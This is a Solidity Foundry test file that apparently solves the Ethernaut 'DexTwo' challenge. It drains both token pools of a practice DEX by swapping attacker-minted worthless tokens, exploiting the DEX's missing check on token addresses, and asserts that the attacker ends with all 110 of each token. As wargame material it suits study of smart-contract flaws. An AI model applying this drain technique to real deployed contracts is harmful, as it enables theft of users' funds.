// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo public dexTwo;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    address public attacker;

    function setUp() public {
        attacker = vm.addr(1);
        dexTwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dexTwo), "Token 1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(dexTwo), "Token 2", "TKN2", 110);
        token1.transfer(address(dexTwo), 100);
        token2.transfer(address(dexTwo), 100);
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        dexTwo.setTokens(address(token1), address(token2));
    }

    function testAttack() public {
        vm.startBroadcast(attacker);

        SwappableTokenTwo tt1 = new SwappableTokenTwo(
            address(dexTwo),
            "Temp Token1",
            "TTKN1",
            200
        );
        tt1.transfer(address(dexTwo), 100);
        tt1.approve(address(dexTwo), 100);

        SwappableTokenTwo tt2 = new SwappableTokenTwo(
            address(dexTwo),
            "Temp Token2",
            "TTKN2",
            200
        );
        tt2.transfer(address(dexTwo), 100);
        tt2.approve(address(dexTwo), 100);

        dexTwo.swap(address(tt1), address(token1), 100);
        dexTwo.swap(address(tt2), address(token2), 100);
        vm.stopBroadcast();

        assertEq(token1.balanceOf(address(dexTwo)), 0);
        assertEq(token2.balanceOf(address(dexTwo)), 0);
        assertEq(token1.balanceOf(attacker), 110);
        assertEq(token2.balanceOf(attacker), 110);
    }
}
